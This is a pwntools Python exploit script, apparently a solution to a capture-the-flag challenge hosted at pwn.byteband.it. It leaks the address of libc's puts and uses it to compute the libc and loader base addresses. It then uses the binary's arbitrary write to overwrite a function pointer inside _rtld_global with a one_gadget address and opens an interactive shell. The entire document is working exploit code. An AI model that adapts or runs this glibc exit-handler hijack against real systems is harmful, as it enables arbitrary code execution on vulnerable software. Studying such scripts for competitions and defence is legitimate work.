#!/usr/bin/env python3

import re
from pwn import *

exe = context.binary = ELF('./write')
libc = ELF("./libc-2.27.so")
ld = ELF("/lib64/ld-linux-x86-64.so.2")

host = args.HOST or 'pwn.byteband.it'
port = int(args.PORT or 9000)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start(env={"LD_PRELOAD": "./libc-2.27.so"})
data = io.recvuntil("(q)uit\n")

puts = int(re.search(b"puts: (0x[0-9a-f]+)\n", data).group(1), 16)
libc.address = puts - libc.sym.puts
ld.address = libc.address + 0x3f1000

log.info("Puts: 0x%x", puts)
log.info("Libc: 0x%x", libc.address)
log.info("Ld: 0x%x", ld.address)
log.info("Rtld: 0x%x", ld.sym._rtld_global)


# <_dl_fini+98>: lea   rdi,[rip+0x217f5f]       # 0x7ffff7ffd968 <_rtld_global+2312>
# <_dl_fini+105>: call   QWORD PTR [rip+0x218551]       # 0x7ffff7ffdf60 <_rtld_global+3840>

io.sendline("w")
io.recvuntil("ptr: ")
io.sendline(str(ld.sym._rtld_global + 3840))

io.recvuntil("val: ")
io.sendline(str(libc.address + 0xe569f))

io.recvuntil("(q)uit\n")
io.sendline("q")

io.interactive()

